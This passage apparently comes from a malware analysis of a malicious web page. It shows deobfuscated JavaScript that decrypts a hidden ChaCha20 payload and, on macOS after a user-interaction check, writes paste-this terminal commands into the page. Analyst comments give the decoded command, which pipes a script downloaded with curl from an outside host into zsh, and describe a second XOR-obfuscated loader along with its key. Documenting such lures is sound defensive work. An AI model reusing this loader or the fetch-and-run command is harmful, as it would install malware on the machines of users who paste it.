    function decryptCommandConfig() {
        const payloadElement =
            document.getElementById(
                PAYLOAD_ELEMENT_ID
            );

        if (!payloadElement) {
            return null;
        }

        const ciphertext =
            decodeBase64Bytes(
                (
                    payloadElement.textContent ||
                    ""
                ).replace(/\s+/g, "")
            );

        const nonce =
            decodeBase64Bytes(
                PAYLOAD_NONCE
            );

        const key =
            deriveKey("");

        const plaintext =
            decryptChaCha20(
                key,
                nonce,
                ciphertext
            );

        return JSON.parse(
            bytesToString(plaintext)
        );
    }

    function exposeCommand() {
        if (payloadLoaded) {
            return;
        }

        if (!interactionGatePassed()) {
            return;
        }

        /*
         * The malicious delivery branch is macOS.
         */
        if (platform !== 1) {
            return;
        }

        try {
            const config =
                decryptCommandConfig();

            if (!config) {
                return;
            }

            const armElement =
                document.getElementById(
                    MAC_ARM_COMMAND_ID
                );

            const intelElement =
                document.getElementById(
                    MAC_INTEL_COMMAND_ID
                );

            if (
                armElement &&
                config.mArm
            ) {
                armElement.textContent =
                    config.mArm;
            }

            if (
                intelElement &&
                config.mIntel
            ) {
                intelElement.textContent =
                    config.mIntel;
            }

            payloadLoaded = true;
        } catch {
        }
    }

    const payloadTimer =
        setInterval(() => {
            if (payloadLoaded) {
                clearInterval(
                    payloadTimer
                );

                return;
            }

            exposeCommand();
        }, 400);
})();


/*
 * Decrypted command configuration
 *
 * {
 *   "m": "echo '<base64>' |base64 -D| zsh",
 *   "mArm": "echo '<base64>' |base64 -D| zsh",
 *   "mIntel": "echo '<base64>' |base64 -D| zsh",
 *   "w": "Loading..."
 * }
 *
 *
 * Decoded terminal command
 *
 * export _run_ts27=5e8d5e49 RATE_n_p9v=true;
 * curl -sL "https://canvas-35.com/curl/n2rfjo98p/bootstrap.sh" |
 *     /bin/zsh
 *
 *
 * A second loader embedded near the end of the document Base64-decodes and
 * XORs another JavaScript blob before appending it to document.head. The
 * resulting script implements the same interaction gate, ChaCha20 payload
 * recovery and command-injection path.
 *
 * XOR key:
 *
 * 7e a6 d5 d5 68 35 23 ea 34 3d 7e 85 07 47 c1 24
 * 10 00 6d 01 5c 2b e4 62 74 35 df ac 3b 3d 5a
 */
